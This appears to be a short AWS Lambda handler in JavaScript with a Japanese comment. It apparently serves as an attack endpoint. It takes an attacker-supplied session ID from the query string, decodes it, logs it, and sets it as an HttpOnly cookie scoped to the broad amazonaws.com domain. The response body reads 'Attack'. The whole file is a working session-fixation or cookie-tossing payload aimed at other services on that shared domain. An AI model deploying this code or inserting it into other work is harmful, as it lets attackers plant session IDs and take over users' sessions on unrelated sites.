exports.handler = async (event) => {

  // パラメータ取得
  const params = event.queryStringParameters;
  const sessionId = params.sessionId.replace(/\-/g, '+').replace(/\_/g, '/').replace(/\~/g, '=');

  console.log(sessionId);

  const response = {
    statusCode: 200,
    headers: {
      'Set-Cookie': `sessionId=${sessionId}; HttpOnly; Secure; domain=amazonaws.com`,
    },
    body: 'Attack'
  };
  return response;
};